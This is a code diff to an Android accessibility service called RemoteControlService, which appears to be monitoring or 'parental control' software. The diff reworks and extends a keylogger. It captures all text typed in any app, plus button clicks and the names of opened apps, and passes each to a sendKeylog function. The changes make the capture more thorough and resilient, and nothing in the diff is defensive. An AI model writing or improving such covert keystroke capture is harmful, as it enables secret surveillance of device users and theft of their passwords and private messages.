@@ -32,23 +32,39 @@ public class RemoteControlService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        // Keylogging Logic
-        int eventType = event.getEventType();
-        String packageName = String.valueOf(event.getPackageName());
+        if (event == null) return;
         
-        switch (eventType) {
-            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
-                String typedText = String.valueOf(event.getText());
-                if (!typedText.isEmpty()) {
-                    Log.d("Keylogger", "[" + packageName + "] Typed: " + typedText);
-                    sendKeylog("[" + packageName + "] " + typedText);
-                }
-                break;
-            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
-                // Log the current app the child is using
-                Log.d("Keylogger", "App Opened: " + packageName);
-                sendKeylog("ABRIO APP: " + packageName);
-                break;
+        int eventType = event.getEventType();
+        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "Desconocido";
+
+        try {
+            switch (eventType) {
+                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
+                    if (event.getText() != null && !event.getText().isEmpty()) {
+                        StringBuilder sb = new StringBuilder();
+                        for (CharSequence cs : event.getText()) {
+                            sb.append(cs);
+                        }
+                        String typedText = sb.toString().trim();
+                        if (!typedText.isEmpty() && !typedText.equals("[]")) {
+                            sendKeylog("[" + packageName + "] TYPED: " + typedText);
+                        }
+                    }
+                    break;
+                case AccessibilityEvent.TYPE_VIEW_CLICKED:
+                    CharSequence desc = event.getContentDescription();
+                    if (event.getText() != null && !event.getText().isEmpty()) {
+                        sendKeylog("[" + packageName + "] CLICKED: " + event.getText().get(0));
+                    } else if (desc != null && desc.length() > 0) {
+                        sendKeylog("[" + packageName + "] CLICKED: " + desc);
+                    }
+                    break;
+                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
+                    sendKeylog("ABRIO APP: " + packageName);
+                    break;
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
